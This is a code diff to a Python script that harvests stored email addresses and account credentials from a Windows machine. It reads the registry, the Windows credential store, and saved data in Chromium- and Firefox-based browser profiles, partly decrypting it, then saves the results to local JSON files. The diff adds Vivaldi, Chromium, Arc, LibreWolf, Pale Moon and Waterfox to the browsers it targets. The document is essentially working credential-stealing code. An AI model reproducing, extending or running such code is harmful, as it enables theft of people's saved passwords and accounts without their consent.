@@ -65,7 +65,7 @@ class Info:
 
 def readJSON(path):
   try:
-    with open(path) as f: 
+    with open(path, encoding="utf8") as f: 
       return json.load(f), None
   except Exception as e:
     return '', e
@@ -122,6 +122,9 @@ def searchChromium():
   searchChromiumFromPath(local + '\\Google\\Chrome\\User Data\\')
   searchChromiumFromPath(local + '\\Microsoft\\Edge\\User Data\\')
   searchChromiumFromPath(local + '\\BraveSoftware\\Brave-Browser\\User Data\\')
+  searchChromiumFromPath(local + '\\Vivaldi\\User Data\\')
+  searchChromiumFromPath(local + '\\Chromium\\User Data\\')
+  searchChromiumFromPath(local + '\\Arc\\User Data\\')
   searchChromiumFromPath(roaming + '\\Opera Software\\Opera Stable\\User Data\\')
   searchChromiumFromPath(roaming + '\\Opera Software\\Opera GX Stable\\User Data\\')
 
@@ -265,6 +268,9 @@ def searchFirefox():
   # Add mails from all known firefox browsers
   searchFirefoxFromPath(roaming + '\\zen\\Profiles\\')
   searchFirefoxFromPath(roaming + '\\Mozilla\\Firefox\\Profiles\\')
+  searchFirefoxFromPath(roaming + '\\librewolf\\Profiles\\')
+  searchFirefoxFromPath(roaming + '\\Moonchild Productions\\Pale Moon\\Profiles\\')
+  searchFirefoxFromPath(roaming + '\\Waterfox\\Profiles\\')
 
 def searchFirefoxFromPath(path):
   # Check if browser path exists
@@ -317,7 +323,7 @@ def searchFirefoxFromPath(path):
       length = params[2]
       key = PBKDF2(hashedSalt, salt, dkLen=length, count=iterations, hmac_hash_module=SHA256)
 
-      # 
+      # Get initialization vector & ciphertext
       iv = bytes([0x04, 0x0E]) + bytes(decodedA11[0][1][1][1])
       ciphertext = bytes(decodedA11[1])
 
@@ -480,8 +486,8 @@ def searchMailInCredentials():
 
 
 
-#  /$$      /$$           /$$          
-# | $$$    /$$$          |__/          
+#  /$$      /$$           /$$
+# | $$$    /$$$          |__/
 # | $$$$  /$$$$  /$$$$$$  /$$ /$$$$$$$ 
 # | $$ $$/$$ $$ |____  $$| $$| $$__  $$
 # | $$  $$$| $$  /$$$$$$$| $$| $$  \ $$
@@ -522,12 +528,37 @@ for i, arg in enumerate(sys.argv):
         case 'j' | 'json' | _:
           Settings.save = SaveAs.JSON
 
+
+
+# Show settings
+print('\n** CURRENT SETTINGS')
+
+# Targets
+if len(Settings.targets) == 0: 
+  print('Not targeting anything -> Exiting')
+  exit(0)
+else:
+  targets = 'Targets: '
+  targetsLength = len(Settings.targets) - 1
+  for i, target in enumerate(Settings.targets):
+    targets += str(target)[7:]
+    if i != targetsLength:
+      targets += ', '
+  print(targets)
+
+# Save as
+print('Save as: ' + str(Settings.save)[7:])
+
+
+
 # Search info
 print('\n** SEARCHING FOR INFORMATION')
 searchMailInRegistry()
 searchMailInCredentials()
 searchChromium()
 searchFirefox()
+
+
 
 # Save info to file
 print('\n** SAVING INFORMATION')
@@ -540,7 +571,7 @@ match Settings.save:
 
       # Save file
       file = open('mails.json', 'w')
-      json.dump(Info.mails, file)
+      json.dump(Info.mails, file, indent=2)
       file.close()
 
     # Accounts
@@ -549,7 +580,7 @@ match Settings.save:
 
       # Save file
       file = open('accounts.json', 'w')
-      json.dump(Info.accounts, file)
+      json.dump(Info.accounts, file, indent=2)
       file.close()
     
   # Save as TXT
